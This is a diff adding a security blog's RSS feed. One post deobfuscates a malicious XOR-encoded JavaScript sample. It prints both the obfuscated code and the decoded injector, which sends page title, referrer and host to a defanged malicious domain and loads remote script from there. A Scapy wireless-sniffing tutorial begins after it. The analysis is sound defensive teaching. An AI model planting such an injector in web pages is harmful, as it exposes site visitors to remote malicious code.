q,amo-hqlkvaj&#39;00&#39;1@&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02tcp&#39;02wwkf&#39;02&#39;1F&#39;02qvpkleEgl&#39;0:7&#39;0;&#39;1@&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02tcp&#39;02l]wpn&#39;02&#39;1F&#39;02&#39;00jvvr&#39;1C--&#39;00&#39;02)&#39;02wwkf&#39;02)&#39;02&#39;00,&#39;00&#39;02)&#39;02`cqg&#39;02)&#39;02&#39;00&#39;1Dfgdcwnv]ig{umpf&#39;1F&#39;00&#39;02)&#39;02fgdcwnv]ig{umpf&#39;02)&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;00&#39;04qg]pgdgppgp&#39;1F&#39;00&#39;02)&#39;02qg]pgdgppgp&#39;02)&#39;02&#39;00&#39;04qmwpag&#39;1F&#39;00&#39;02)&#39;02jmqv&#39;1@&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02kd&#39;02&#39;0:fgdcwnv]ig{umpf&#39;02&#39;03&#39;1F&#39;1F&#39;02lwnn&#39;02&#39;04&#39;04&#39;02fgdcwnv]ig{umpf&#39;02&#39;03&#39;1F&#39;1F&#39;02&#39;05&#39;05&#39;02&#39;04&#39;04&#39;02qg]pgdgppgp&#39;02&#39;03&#39;1F&#39;1F&#39;02lwnn&#39;02&#39;04&#39;04&#39;02qg]pgdgppgp&#39;02&#39;03&#39;1F&#39;1F&#39;02&#39;05&#39;05&#39;0;&#39;5@&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02fmawoglv,upkvg&#39;0:&#39;05&#39;1Aqapkrv&#39;02v{rg&#39;1F&#39;00vgzv-hctcqapkrv&#39;00&#39;02qpa&#39;1F&#39;00&#39;05&#39;02)&#39;02l]wpn&#39;02)&#39;02&#39;05&#39;00&#39;1G&#39;05&#39;02)&#39;02&#39;05&#39;1A&#39;05&#39;02)&#39;02&#39;05-qapkrv&#39;1G&#39;05&#39;0;&#39;1@&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;5F&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;1A-qapkrv&#39;1G&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;clen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;clen&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fromCharCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;unescape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;analysis-part-1&quot;&gt;Analysis Part 1&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;So, clearly, this was pretty easy to pick out from the returned webpage when viewing the http stream.&lt;/p&gt;
+
+&lt;p&gt;Lets review some of the methods that the malicious actor is using to hide the original code.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;charCodeAt()&lt;/code&gt;:
+    &lt;ul&gt;
+      &lt;li&gt;This method will return the unicode character of a letter based on the string that is  provided and the number that is passed to the argument.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Bitwise XOR&lt;/code&gt;:
+    &lt;ul&gt;
+      &lt;li&gt;The “^” operator in JavaScript is for bitwise XORing. In an example of “a XOR b”, if a == b, then the result is 0, else the result is 1.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fromCharCode()&lt;/code&gt;:
+    &lt;ul&gt;
+      &lt;li&gt;This method will convert a unicode number into its ascii character equivalent.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;unescape()&lt;/code&gt;:
+    &lt;ul&gt;
+      &lt;li&gt;This method is used for the encoding and decoding of strings.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;the-greatness-of-printing&quot;&gt;The Greatness of Printing&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;So we have the malicious JavaScript and did some research to get an understanding of how the original code is being hidden. If we don’t have the time to put together a script to reverse the encoded text, perhaps we can get away with a quicker work around.&lt;/p&gt;
+
+&lt;p&gt;The great thing about this particular example is that we can see all of the code necessary to reverse the output was provided. In some cases, it’s not this simple and code might be loaded in from things like other scripts or html elements within the page.&lt;/p&gt;
+
+&lt;p&gt;Lets take a look at the last line of code,&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;document.write(c)&quot;&lt;/code&gt;. This method will write out the contents of the variable “c” back to the webpage, which is the decoded content. Instead of writing this back to the webpage, lets see what we can do to reveal this content.&lt;/p&gt;
+
+&lt;p&gt;A great tool to help with this task is &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey&quot;&gt;SpiderMonkey&lt;/a&gt; from Mozilla. Follow the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey/Build_Documentation&quot;&gt;build instructions&lt;/a&gt; for your operating system before continuing.&lt;/p&gt;
+
+&lt;p&gt;Now that SpiderMonkey is installed, we can execute JavaScript from a terminal window for ease of use.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Copy the JavaScript from above and place it into a temporary file with a “.js” extension. For this example, I’ve called it mal.js&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Before saving the file, edit the last line of code and switch it from “&lt;code class=&quot;highlighter-rouge&quot;&gt;document.write(c);&lt;/code&gt;” to “&lt;code class=&quot;highlighter-rouge&quot;&gt;print(c);&lt;/code&gt;”. Save the file.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;From the terminal, type “js mal.js”.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;You should now see the decoded text. I’ve added brackets around the domain since it is malicious, so please be careful.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stringGen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+	&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;charset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    	&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;floor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;default_keyword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;encodeURIComponent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;se_referrer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;encodeURIComponent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;referrer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;encodeURIComponent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;i[.]illuminationes[.]com/jsnitch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;uuid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stringGen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;uuid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;?default_keyword=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;default_keyword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
+                &lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;se_referrer=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;se_referrer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;source=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;default_keyword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;default_keyword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;se_referrer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;se_referrer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    	&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&amp;lt;script type=&quot;text/JavaScript&quot; src=&quot;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&quot;&amp;gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&amp;lt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;/script&amp;gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;analysis-part-2&quot;&gt;Analysis Part 2&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Now that we can see the code, the process starts over again with analyzing the sample to get an understanding of what is occurring.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;stringGen(len)&lt;/code&gt;:
+    &lt;ul&gt;
+      &lt;li&gt;Randomly generates a 5 character string. The result is assigned to the “uuid” variable.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;The following are standard JavaScript methods that access DOM elements.
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;document.title&lt;/code&gt; - current page title.&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;document.referer&lt;/code&gt; - the referrer webpage that lead to the current document.&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;window.location.host&lt;/code&gt; - the current domain&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;var base&lt;/code&gt;:
+    &lt;ul&gt;
+      &lt;li&gt;The base url which will be used in structuring the full url request.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;var n_url&lt;/code&gt;:
+    &lt;ul&gt;
+      &lt;li&gt;This variable holds the formatting of the url where additional JavaScript will be retreived. Example: “http://abcde.baseurl./directory?default_keyword=currentwebpagetitle&amp;amp;se_referrer=documentreferrer&amp;amp;source=currentdomain”&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;The last couple lines is an “if” condition which evaluated whether or not the two variables exist (default_keyword and se_referrer).
+    &lt;ul&gt;
+      &lt;li&gt;If they exist, then an addidional &amp;lt;script&amp;gt; tag is added with the source being the completed url assigned to variable “n_url”.&lt;/li&gt;
+      &lt;li&gt;If they do not, then the additonal JavaScript is not downloaded.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;So if you you went to the website directly (eg: without clicking a link from a google search), then the additonal JavaScript does not get executed.&lt;/p&gt;
+
+&lt;h3 id=&quot;summary&quot;&gt;Summary&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Alas, we’ve come this far only to hit a roadblock. Due to the random generation of 5 characters for the sub domain, DNS requests fail because the domains have not been stood up. It’s my guess that the adversary hasn’t been able to register all variations, which will likely lead to a lower success rate for exploitation. If you look up the main domain within &lt;a href=&quot;https://www.virustotal.com/en/domain/i.illuminationes.com/information/&quot;&gt;VirusTotal&lt;/a&gt;, you will see that there are detections for a good amount of subdomains that match the naming convention we’ve uncovered. I’ve even tried reaching a couple of these without success. Even though we couldn’t get this to dance the way we wanted, it was a good exercise in reviewing JavaScript and obfuscation techniques.&lt;/p&gt;
+</description>
+        <pubDate>Sun, 18 Oct 2015 15:25:30 -0400</pubDate>
+        <link>http://localhost//2015/JavaScript-Deobfuscate-With-Just-A-Print-Function/</link>
+        <guid isPermaLink="true">http://localhost//2015/JavaScript-Deobfuscate-With-Just-A-Print-Function/</guid>
+        
+        <category>javascript</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>Python: Wireless Sniffing With Scapy</title>
+        <description>&lt;p&gt;Before we dive into it, I’d first like to take a momemnt to make sure whomever follows this tutorial has the correct components installed. I will be performing this on an Ubuntu system, but really, any platform should be able to be used, you’ll just have to follow the recommended intallation steps for your operating system.&lt;/p&gt;
+
+&lt;h3 id=&quot;setup&quot;&gt;Setup&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;ol&gt;
+  &lt;li&gt;We’ll be using Python 2.7.
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
+  python -V #for your version
+ &lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Scapy will be the main module used.
+    &lt;ul&gt;
+      &lt;li&gt;Download &lt;a href=&quot;https://bitbucket.org/secdev/scapy/downloads/scapy-2.3.1.zip&quot;&gt;Scapy&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;Extract archive and cd into the folder&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
+  sudo python setup.py install
+ &lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Termcolor will colorize our output.
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
+  sudo pip install termcolor
+ &lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;We’ll be using airmon-ng to setup our wireless card.
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
+  sudo apt-get install aircrack-ng
+ &lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;the-code&quot;&gt;The Code&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Now that we’ve installed everything we need, lets start stepping through the code!&lt;/p&gt;
+
+&lt;p&gt;We’ll begin by first specifying our interpreter, followed by importing the modules we’ll use. You’ll probably notice the 3rd line for logging and think “What the heck is that for?” Without this line, whenever the script is ran, an annoying message will pop up regarding Scapy IPv6 routes. The logging line will quite that, while still alerting to any serious errors that may occur.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;logging&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Silence Scapy IPv6 message at runtime&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;logging&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getLogger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;scapy.runtime&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setLevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;logging&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scapy.all&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;termcolor&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;colored&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cprint&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;argparse&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;datetime&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We’ll then move on to setting up some of the configuration with variables we’ll use later on.&lt;/p&gt;
+
+&lt;p&gt;In order to gather more information and profile wireless connections, we’ll parse a file that correlates MAC addresses to vendors based on what we sniff. These combinations will be stored into a dictionay as a key/value pair for searching later.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Keep track of unique mac addresses&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;mac_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Vendors&lt;/span&gt;
